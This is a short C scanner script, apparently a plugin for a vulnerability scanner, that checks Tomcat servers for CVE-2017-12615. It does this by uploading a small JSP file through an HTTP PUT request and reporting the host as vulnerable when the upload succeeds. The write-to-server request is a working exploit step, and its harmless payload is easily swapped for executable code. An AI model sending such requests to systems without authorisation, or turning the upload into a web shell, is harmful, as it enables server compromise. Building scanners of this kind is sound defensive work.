/* http-vuln-cve2017-12615-3 - Tomcat PUT JSP probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[4096];
    int code;
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_request(ctx, "PUT", "/almap.jsp/", NULL, "\r\n",
                        "<% out.println(\"ALMAP\"); %>", "text/plain",
                        resp, sizeof(resp));
    code = ar_http_status(resp);
    if (n > 0 && (code == 200 || code == 201 || code == 204)) {
        ar_out(ctx, "potentially vulnerable: CVE-2017-12615 Tomcat "
               "PUT (HTTP %d)", code);
    } else {
        ar_out(ctx, "not vulnerable: CVE-2017-12615 (HTTP %d)", code);
    }
    return 0;
}
